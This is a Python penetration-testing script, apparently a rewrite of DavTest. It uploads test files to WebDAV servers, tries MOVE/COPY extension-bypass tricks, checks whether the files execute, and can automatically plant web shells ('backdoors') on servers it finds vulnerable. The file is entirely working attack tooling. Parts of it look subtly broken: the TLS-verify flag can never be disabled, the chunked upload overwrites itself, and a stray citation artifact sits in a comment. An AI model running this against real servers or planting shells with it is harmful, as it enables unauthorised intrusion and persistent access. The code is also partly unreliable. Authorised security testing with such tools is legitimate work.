#!/usr/bin/env python3
"""
DAVTester – Modern WebDAV upload / execution tester
Author ....: RewardOne, John (rewrite)
Version ...: 2.0.0  (19‑Apr‑2025)
Licence ...: GPL‑3.0
"""

from __future__ import annotations
import argparse, logging, os, sys, random, re, signal, json, time
from pathlib import Path
from typing   import Dict, List, Optional, Tuple

from rich.console  import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.table    import Table
from rich.prompt   import Confirm

from webdav3.client import Client                     # :contentReference[oaicite:1]{index=1}
import requests                                       # raw GET bypass
from requests.auth import HTTPBasicAuth, HTTPDigestAuth

# ─────────────────────────── Globals ────────────────────────────
console = Console()
LOGDIR  = Path.cwd() / "logs"
LOGDIR.mkdir(exist_ok=True)
logger  = logging.getLogger("davtester")

# graceful Ctrl‑C
def sigint_handler(sig, _):
    console.print("[bold red]\n⛔  Interrupted – flushing state & summary …[/]")
    raise SystemExit(130)
signal.signal(signal.SIGINT, sigint_handler)

# ────────────────────────── Utilities ───────────────────────────
def random_sid(seed: Optional[str] = None) -> str:
    if seed:
        return seed
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
    return "".join(random.choice(chars) for _ in range(random.randint(8, 14)))

def load_tests(sid: str) -> Dict[str, Dict[str, str]]:
    """
    Read YAML test‑pack(s). Each file describes one extension:
      filename:  davtest_<SID>.<ext>
      content:   payload to upload
      execmatch: regex string expected in response when executed
    """
    import yaml  # pyyaml
    tests: Dict[str, Dict[str, str]] = {}
    for yml in Path("tests").glob("*.yaml"):
        with open(yml, "r", encoding="utf-8") as f:
            data = yaml.safe_load(f)
            ext  = yml.stem
            tests[ext] = {
                "filename" : f"davtest_{sid}.{ext}",
                "content"  : data["content"].replace("$$FILENAME$$", f"davtest_{sid}.{ext}"),
                "execmatch": data["execmatch"],
                "result"   : False,
                "executed" : False
            }
    if not tests:
        console.print("[yellow]No test packs found in ./tests – aborting[/]")
        sys.exit(1)
    return tests

def setup_logging(level: str):
    lvl = getattr(logging, level.upper(), logging.INFO)
    logging.basicConfig(
        level=lvl,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        handlers=[
            logging.FileHandler(LOGDIR / "davtester.log", encoding="utf-8"),
            logging.StreamHandler(sys.stdout if lvl >= logging.INFO else sys.stderr)
        ],
    )

# ─────────────────────── DAV Client wrapper ─────────────────────
class DAVWrapper:
    """Thin wrapper adding retry/back‑off and progress reporting"""
    def __init__(self, url: str, args: argparse.Namespace):
        self.base_url = url.rstrip("/")
        options = {"webdav_hostname": self.base_url,
                   "webdav_timeout": 30}

        if args.auth:
            u, p   = args.auth.split(":", 1)
            options["webdav_login"]    = u
            options["webdav_password"] = p
            options["webdav_preauth"]  = True
        if args.cert and args.key:
            options["webdav_cert_path"] = args.cert
            options["webdav_key_path"]  = args.key
        if args.verify is False:
            options["disable_check"] = True

        self.client = Client(options)

    # --------------- HTTP helpers --------------
    def _retry(fn):
        def wrapper(self, *a, **kw):
            tries = 0
            while True:
                try:
                    return fn(self, *a, **kw)
                except Exception as e:
                    tries += 1
                    if tries > 3:
                        raise
                    logger.warning("Error %s – retry %s/3", e, tries)
                    time.sleep(2 ** tries)
        return wrapper

    @_retry
    def mkdir(self, path: str):
        self.client.mkdir(path)

    @_retry
    def delete(self, path: str):
        self.client.clean(path)

    @_retry
    def upload(self, remote_path: str, local_bytes: bytes):
        # stream upload with progress
        total = len(local_bytes)
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("{task.completed}/{task.total} bytes"),
                      console=console, transient=True) as prog:
            task = prog.add_task(f"PUT {Path(remote_path).name}", total=total)
            # chunking
            chunk = 65536
            for i in range(0, total, chunk):
                self.client.upload_to(buff=local_bytes[i:i+chunk],
                                      remote_path=remote_path,
                                      chunk_size=chunk, override=True)
                prog.update(task, advance=min(chunk, total - i))

    @_retry
    def move(self, src: str, dst: str):
        self.client.move(remote_path_from=src, remote_path_to=dst, overwrite=True)

    @_retry
    def copy(self, src: str, dst: str):
        self.client.copy(remote_path_from=src, remote_path_to=dst, overwrite=True)

    def raw_get(self, full_url: str) -> str:
        r = requests.get(full_url, timeout=15, verify=False)      # verify may be False already
        r.raise_for_status()
        return re.sub(r"<.+?>", "", r.text, flags=re.S)  # strip HTML

# ─────────────────────────── Main logic ──────────────────────────
def main():
    ap = argparse.ArgumentParser(
        prog="davtester",
        description="Modern WebDAV upload‑and‑exec tester – rewrite of DavTest 1.2",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    ap.add_argument("-u", "--url", required=True, help="Base WebDAV URL")
    ap.add_argument("-A", "--auth", help="user:pass (Basic/Digest)")
    ap.add_argument("--realm", help="Auth realm (auto if omitted)")
    ap.add_argument("--cert", help="Client certificate (PEM)")
    ap.add_argument("--key",  help="Client key (PEM)")
    ap.add_argument("--verify", action="store_true", default=True, help="Verify TLS cert")
    ap.add_argument("--sid", help="Custom session ID string")
    ap.add_argument("--create-dir", metavar="DIR", help="Create <DIR> under base URL")
    ap.add_argument("--move", action="store_true", help="Use MOVE bypass")
    ap.add_argument("--copy", action="store_true", help="Use COPY bypass")
    ap.add_argument("--backdoors", choices=["auto", "none"], default="none",
                    help="Upload shells if exec succeeded")
    ap.add_argument("--cleanup", action="store_true", help="Delete files afterwards")
    ap.add_argument("--log-level", default="INFO", choices=["DEBUG","INFO","WARNING","ERROR"])
    ap.add_argument("--quick", action="store_true", help="Stop after first success")
    args = ap.parse_args()

    setup_logging(args.log_level)

    sid   = random_sid(args.sid)
    tests = load_tests(sid)

    console.rule(f"[bold cyan]💡 Session SID: {sid}")

    dav = DAVWrapper(args.url, args)

    base_url = args.url.rstrip("/")
    if args.create_dir:
        target_dir = f"{base_url}/{args.create_dir.strip('/')}"
        logger.info("Creating directory %s", target_dir)
        dav.mkdir(target_dir)
        base_url = target_dir

    success_any = False
    created     = []

    # PUT phase  ──────────────────────────────────────────────
    for ext, meta in tests.items():
        remote = f"{base_url}/{meta['filename']}"
        try:
            dav.upload(remote, meta["content"].encode())
            logger.info("PUT %s OK", remote)
            meta["result"] = True
            created.append(remote)
        except Exception as e:
            logger.debug("PUT %s failed: %s", remote, e)

    # MOVE/COPY bypasses ──────────────────────────────────────
    if args.move or args.copy:
        verb = "MOVE" if args.move else "COPY"
        op   = dav.move if args.move else dav.copy

        for ext, meta in tests.items():
            if not meta["result"]:
                continue

            orig = f"{base_url}/{meta['filename']}"
            txt  = orig.replace(f".{ext}", f"_{ext}.txt")
            bypass = orig.replace(f".{ext}", f".{ext};.txt")

            try:
                dav.upload(txt, meta["content"].encode())
                op(txt, orig)
                op(txt, bypass)
                logger.info("%s %s & %s OK", verb, orig, bypass)
            except Exception as e:
                logger.debug("%s bypass failed for %s: %s", verb, ext, e)

    # EXEC check ──────────────────────────────────────────────
    for ext, meta in tests.items():
        if not meta["result"]:
            continue
        for variant in (meta["filename"], meta["filename"].replace(f".{ext}", f".{ext};.txt")):
            url_variant = f"{base_url}/{variant}"
            try:
                body = dav.raw_get(url_variant)
                if re.search(meta["execmatch"], body, flags=re.S):
                    meta["executed"] = True
                    success_any = True
                    logger.info("EXEC OK %s", url_variant)
                    if args.quick:
                        raise SystemExit(0)
            except Exception as e:
                logger.debug("EXEC check %s failed: %s", url_variant, e)

    # OPTIONAL: backdoor upload  ─────────────────────────────
    if args.backdoors != "none" and success_any:
        shells = list(Path("backdoors").glob("*"))
        for ext, meta in tests.items():
            if not meta["executed"]:
                continue
            for shell in shells:
                if shell.suffix.lstrip(".") != ext:
                    continue
                remote_shell = f"{base_url}/{sid}_{shell.name}"
                dav.upload(remote_shell, shell.read_bytes())
                logger.info("Shell uploaded %s", remote_shell)

    # CLEANUP  ────────────────────────────────────────────────
    if args.cleanup:
        logger.info("Cleanup requested – deleting created objects")
        for item in created:
            try:
                dav.delete(item)
            except Exception:
                pass
        if args.create_dir:
            try:
                dav.delete(f"{args.url.rstrip('/')}/{args.create_dir.strip('/')}")
            except Exception:
                pass

    # SUMMARY  ───────────────────────────────────────────────
    table = Table(title="DAVTester Summary", show_header=True, header_style="bold magenta")
    table.add_column("Ext")
    table.add_column("Uploaded")
    table.add_column("Executable")
    for ext, meta in tests.items():
        table.add_row(ext,
                      "✅" if meta["result"]   else "❌",
                      "💥" if meta["executed"] else "―")
    console.print(table)

    report = {
        "target": args.url,
        "session": sid,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "results": {k: {"uploaded": v["result"], "executed": v["executed"]}
                    for k, v in tests.items()}
    }
    report_path = Path(f"report_davtester_{sid}.json")
    report_path.write_text(json.dumps(report, indent=2))
    console.print(f"[green]Report saved → {report_path}[/]")

if __name__ == "__main__":
    main()
